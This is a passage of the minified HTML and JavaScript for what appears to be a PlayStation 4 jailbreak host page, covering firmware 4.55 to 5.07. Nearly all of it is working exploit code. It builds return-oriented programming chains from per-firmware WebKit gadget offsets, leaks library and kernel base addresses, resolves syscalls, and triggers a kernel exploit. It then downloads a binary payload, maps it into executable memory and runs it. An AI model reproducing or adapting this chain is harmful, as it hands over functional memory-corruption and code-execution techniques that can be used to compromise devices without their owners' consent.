rdi"]),rs.push(s),rs.push(window.gadgets["pop rsi"]),rs.push(2148549243),rs.push(window.gadgets["pop rdx"]),rs.push(g),rs.push(window.syscalls[54]),rs.push(window.gadgets["pop rax"]),rs.push(ss),rs.push(window.gadgets["mov rax, [rax]"]),rs.push(window.gadgets["pop rdi"]),rs.push(0),rs.push(window.gadgets["add rdi, rax"]),rs.push(window.gadgets["pop rsi"]),rs.push(as),rs.push(window.gadgets["pop rdx"]),rs.push(1),rs.push(window.gadgets["pop rcx"]),rs.push(0),rs.push(window.gadgets["pop r8"]),rs.push(0),rs.push(window.syscalls[363]),rs.push(window.gadgets["pop rdi"]),rs.push(a),rs.push(window.gadgets["pop rsi"]),rs.push(2148549243),rs.push(window.gadgets["pop rdx"]),rs.push(t),rs.push(window.syscalls[54]),rs.push(window.gadgets["pop rax"]),rs.push(ss),rs.push(window.gadgets["mov rax, [rax]"]),rs.push(window.gadgets["pop rdi"]),rs.push(0),rs.push(window.gadgets["add rdi, rax"]),rs.push(window.syscalls[6]),rs.run(),0!=v.backing[0])return p.syscall(74,ds,16384,7),p.fcall(ds),!0}catch(s){throw new Error(ex.message)}return!1}var p,get_jmptgt=function(s){var a=65535&p.read4(s),d=p.read4(s.add32(2));return 9727==a?s.add32(d+6):0},gadgetmap_wk={ep:[91,65,92,65,93,65,94,65,95,93,195],"pop rsi":[94,195],"pop rdi":[95,195],"pop rsp":[92,195],"pop rax":[88,195],"pop rdx":[90,195],"pop rcx":[89,195],"pop rsp":[92,195],"pop rbp":[93,195],"pop r8":[71,88,195],"pop r9":[71,89,195],infloop:[235,254,195],ret:[195],"mov [rdi], rsi":[72,137,55,195],"mov [rax], rsi":[72,137,48,195],"mov [rdi], rax":[72,137,7,195],"mov rax, rdi":[72,137,248,195]},slowpath_jop=[72,139,127,72,72,139,7,72,139,64,48,255,224];slowpath_jop.reverse();var gadgets;window.stage2=function(){try{window.stage2_()}catch(s){throw new Error(s.message)}};var spoofedFW={"5.00":"5.01",5.07:"5.05","9.00":"4.05",9.01:"4.55",9.02:"4.74",9.03:"5.01",9.04:"5.03",9.05:"5.05"},fwFromUA=navigator.userAgent.substring(navigator.userAgent.indexOf("5.0 (")+19,navigator.userAgent.indexOf(") Apple"));fwFromUA in spoofedFW&&(fwFromUA=spoofedFW[fwFromUA]),"5.01"==fwFromUA?(gadgetcache={ret:60,"jmp rax":130,ep:173,"pop rbp":182,"mov [rdi], rax":1332075,"pop r8":96709,"pop rax":17397,"mov rax, rdi":22736,"mov rax, [rax]":444474,"pop rsi":586634,"pop rdi":232890,"pop rcx":339545,"pop rsp":124551,"mov [rdi], rsi":146114,"mov [rax], rsi":2450855,"pop rdx":912834,"pop r9":12267727,jop:800720,infloop:22147018,"add rax, rcx":87771,"mov rdx, rax":3488369,"mov rdi, rax":22691759,"mov rax, rdx":1896032,jop1:19535949,jop2:7271141,jop3:22848155,jop4:19416756,"jop_mov rbp, rsp":985418,jop6:2566305,ret2userland:380345,"mov rax, [rdi]":290553,"add rdi, rax":5592687,"add rax, rsi":1384646,"and rax, rsi":22481439,"jmp rdi":2710974,longjmp:5352,createThread:7836048},gadgetshiftcache={stackshift_jop1:88,stackshift_jop6:40}):"5.05"==fwFromUA?(gadgetcache={ret:60,"jmp rax":130,ep:173,"pop rbp":182,"mov [rdi], rax":3857131,"pop r8":96709,"pop rax":17397,"mov rax, rdi":22736,"mov rax, [rax]":444474,"pop rsi":586634,"pop rdi":232890,"pop rcx":339545,"pop rsp":124551,"mov [rdi], rsi":146114,"mov [rax], rsi":2451047,"pop rdx":1826852,"pop r9":12268047,jop:800720,infloop:22306474,"add rax, rcx":87771,"mov rdx, rax":3488561,"mov rdi, rax":22692143,"mov rax, rdx":1896224,ret2userland:380345,jop1:19536333,jop2:7271653,jop3:22848539,jop4:19417140,"jop_mov rbp, rsp":985418,jop6:2566497,"mov rax, [rdi]":290553,"add rdi, rax":5593055,"add rax, rsi":1384646,"and rax, rsi":22481823,"jmp rdi":2711166,"mov [rsi], rdx":10896650,longjmp:5352,createThread:7836560},gadgetshiftcache={stackshift_jop1:88,stackshift_jop6:40}):("4.55"==fwFromUA||"4.74"==fwFromUA)&&(gadgetcache={ret:60,"jmp rax":130,ep:173,"pop rbp":182,"mov [rdi], rax":16314,"pop r8":52290,"pop rax":52291,"mov rax, rdi":59470,"mov rax, [rax]":77987,"pop rsi":504302,"pop rdi":504381,"pop rcx":2563555,"pop rsp":2597968,"mov [rdi], rsi":3788656,"mov [rax], rsi":3999863,"pop rdx":5658680,"pop r9":7911967,jop:19362640,infloop:19677193,"add rax, rcx":8704077,"mov rdx, rax":76310,"mov rax, rdx":1986270,"mov rax, [rdi]":1286688,"add rdi, rax":21090765,"add rax, rsi":13049540,"jmp rdi":1582869,ret2userland:561244,"add [r9], rbp":20057265,"mov rsp, rdx":15982288,test:10402,"sub rax, rcx":15288203,"add rsi, [rdi]; mov rax, rsi":18469360,"jmp rdx_more":1382343,jop1:6108765,jop2:8064613,jop3:21151163,jop4:6519492,"jop_mov rbp, rsp":1792890,jop6:997661,"mov [rsi], rdx":22495238,longjmp:5208,createThread:18279744},gadgetshiftcache={stackshift_jop1:72,stackshift_jop6:40});try{window.gadgets_shift=gadgetshiftcache}catch(s){}window.stage2_=function(){try{if(4.55>parseFloat(fwFromUA)||5.05<parseFloat(fwFromUA))throw new Error("Only firmwares 4.55-5.07 are supported!")}catch(s){throw new Error("Only firmwares 4.55-5.07 are supported!")}p=window.prim,p.leakfunc=function(s){var a=p.leakval(s);return p.read8(a.add32(24)).add32(64)};var s=p.leakfunc(parseFloat),a=p.read8(s),d=a;if("5.01"==fwFromUA||"5.03"==fwFromUA||"5.05"==fwFromUA)d.sub32inplace(5735744);else if("4.55"==fwFromUA||"4.74"==fwFromUA)d.sub32inplace(15261088);else throw new Error("Unknown parseFloat offset! parseFloatPtr: "+a);window.webKitBase=d;var r=function(s){return d.add32(s)};window.o2wk=r,"4.55"==fwFromUA||"4.74"==fwFromUA?gadgets={__stack_chk_fail:r(200),__stack_chk_fail_offset:53648,memcmp:r(552),memcmp_offset:466016,memset:r(584),memset_offset:175632,setjmp:r(5224)}:("5.01"==fwFromUA||"5.03"==fwFromUA||"5.05"==fwFromUA)&&(gadgets={__stack_chk_fail:r(200),__stack_chk_fail_offset:73408,memcmp:r(520),memcmp_offset:569248,memset:r(552),memset_offset:280,setjmp:r(5368)});var e=p.read8(get_jmptgt(gadgets.memset));e.sub32inplace(gadgets.memset_offset),window.libSceLibcInternalBase=e;window.o2lc=function(s){return e.add32(s)};var g=p.read8(get_jmptgt(gadgets.__stack_chk_fail));g.sub32inplace(gadgets.__stack_chk_fail_offset),window.libKernelBase=g;window.o2lk=function(s){return g.add32(s)};var t=new Uint8Array(4096),o=p.leakval(t).add32(16),h=p.read8(o);p.write8(o,d),p.write4(o.add32(8),50670904);var u=0,x=[];for(var l in gadgetmap_wk)gadgetmap_wk.hasOwnProperty(l)&&(u++,x.push(l),gadgetmap_wk[l].reverse());u++;var c=function(s){if(gadgetcache)for(var a in u=0,slowpath_jop=0,gadgetcache)gadgetcache.hasOwnProperty(a)&&(gadgets[a]=r(gadgetcache[a]));else for(var p=0;p<t.length;p++){if(195==t[p]){for(var d,e=0;e<x.length;e++)if(d=1,!!x[e]){for(var g=gadgetmap_wk[x[e]],o=0;o<g.length;o++)if(g[o]!=t[p-o]){d=0;break}d&&(gadgets[x[e]]=r(p-g.length+1),gadgetoffs[x[e]]=p-g.length+1,delete x[e],u--)}}else if(224==t[p]&&255==t[p-1]&&slowpath_jop){for(var d=1,o=0;o<slowpath_jop.length;o++)if(slowpath_jop[o]!=t[p-o]){d=0;break}if(!d)continue;gadgets.jop=r(p-slowpath_jop.length+1),gadgetoffs.jop=p-slowpath_jop.length+1,u--,slowpath_jop=0}if(!u)break}u||slowpath_jop||setTimeout(s,50)};c(function(){});for(var m,n,v,f;m={a:0,b:0,c:0,d:0},n={a:0,b:0,c:0,d:0},f=p.leakval(n),v=p.leakval(m),v.low-48!=f.low;);[].length=128;var w,y=new Uint32Array(256);nogc.push(y);var k=function(a){var d=0,r=0,e=0;w=p.read8(p.leakval(y).add32(16)),p.write8(w.add32(48),gadgets.setjmp),p.write8(w.add32(128),gadgets.jop),p.write8(w,w),p.write8(s,gadgets.jop);var g=p.read8(f),t=p.read8(f.add32(72));return p.write8(f,w.add32(80)),p.write8(f.add32(72),w),parseFloat(n,n,n,n,n,n),p.write8(f,g),p.write8(f.add32(72),t),d=p.read8(w.add32(16)),rtv=Array.prototype.splice.apply({length:{valueOf:function(){e=p.read8(d),r=p.read8(d.add32(8));var s=d,g=a.count;a.push_write8(d,e),a.push_write8(d.add32(8),r),a.runtime&&(s=a.runtime(d)),a.push(gadgets["pop rsp"]),a.push(s),a.count=g,p.write8(d,gadgets["pop rsp"]),p.write8(d.add32(8),a.stackBase)}}}),p.leakval(rtv)};gadgets=gadgets,p.loadchain=k;var b=new Uint8Array(4096),j=p.leakval(b).add32(16),_=p.read8(j);p.write8(j,window.libKernelBase),p.write4(j.add32(8),262144);for(var B,P=0;262144>P;P++)if(114==b[P]&&100==b[P+1]&&108==b[P+2]&&111==b[P+3]&&99==b[P+4]){B=P;break}p.write4(j.add32(8),B+32),window.syscalls={};for(var E=new Uint32Array(1),S=new Uint8Array(E.buffer),P=0;P<B;P++)if(72==b[P]&&199==b[P+1]&&192==b[P+2]&&73==b[P+7]&&137==b[P+8]&&202==b[P+9]&&15==b[P+10]&&5==b[P+11]){S[0]=b[P+3],S[1]=b[P+4],S[2]=b[P+5],S[3]=b[P+6];var I=E[0];window.syscalls[I]=window.libKernelBase.add32(P)}var A,F=new window.rop;if(p.fcall_=function(s,a,d,r,e,g,t){if(F.clear(),F.notimes=this.next_notime,this.next_notime=1,F.fcall(s,a,d,r,e,g,t),F.push(window.gadgets["pop rdi"]),F.push(F.stackBase.add32(16376)),F.push(window.gadgets["mov [rdi], rax"]),F.push(window.gadgets["pop rax"]),F.push(p.leakval(1094795842)),1094795842!=F.run().low)throw new Error("Unexpected rop behaviour!");A=p.read8(F.stackBase.add32(16376))},p.fcall=function(){p.fcall_.apply(this,arguments);return A},p.readstr=function(s){for(var a=String.fromCharCode,d=s.add32(0),r=p.read4(d),e="";255&r;)e+=a(255&r),d.add32inplace(1),r=p.read4(d);return e},p.syscall=function(s,a,d,r,e,g,t){if("number"!=typeof s)throw new Error("Invalid syscall!");var o=window.syscalls[s];if(null==o)throw new Error("Invalid syscall!");return p.fcall(o,a,d,r,e,g,t)},p.stringify=function(s){for(var a=new Uint8Array(s.length+1),d=0;d<s.length;d++)a[d]=255&s.charCodeAt(d);return window.nogc.push(a),p.read8(p.leakval(a).add32(16))},p.malloc=function(s){var a=new Uint8Array(65536+s);window.nogc.push(a);var d=p.read8(p.leakval(a).add32(16));return d.backing=a,d},p.malloc32=function(s){var a=new Uint8Array(65536+4*s);window.nogc.push(a);var d=p.read8(p.leakval(a).add32(16));return d.backing=new Uint32Array(a.buffer),d},"0"!=p.syscall(23,0))for(;!kernExploit(););(function(s){var a=new XMLHttpRequest;a.open("GET",s,!0),a.responseType="arraybuffer",a.onload=function(){try{if(4===a.readyState&&200===a.status){var s=new Uint8Array(4-a.response.byteLength%4%4),d=new Uint8Array(a.response.byteLength+s.byteLength);d.set(new Uint8Array(a.response),0),d.set(s,a.response.byteLength);var r=new Uint32Array(d.buffer),e=new int64(638582784,9),g=p.syscall(477,e,3145728,7,266240,-1,0);if("926100000"==g){for(var t=0;t<r.length;t++)window.payloadPatch.hasOwnProperty(t)?p.write4(e.add32(1048576+4*t),window.payloadPatch[t]):p.write4(e.add32(1048576+4*t),r[t]);p.fcall(e);for(var t=0;3145728>t;t+=8)p.write8(e.add32(t),0)}else throw new Error("Could not Allocate Buffer!")}else throw new Error("Issue Retreiving Payload!")}catch(s){throw new Error(s.message)}},a.onerror=function(){throw new Error("Issue Retreiving Payload!")},a.send()})("./kclock.bin"),allset()};</script><div class=loader id=loader></div><div class=info id=awaiting style=display:none>Awaiting Payload...</div><div class=info id=allset style=display:none>Success!</div><div class=info id=fail style=display:none>Fail!</div><div class=info id=badfw style=display:none>Only firmwares 4.55-5.07 are supported!</div><div class=credits id=footer><ul style=list-style:none;padding-left:0><li>Exploits from qwertyoruiopz<li>Homebrew thanks to flatz, idc, WildCard, zecoxao, xvortex<li>Implementation by Specter and CelesteBlue</ul></div>
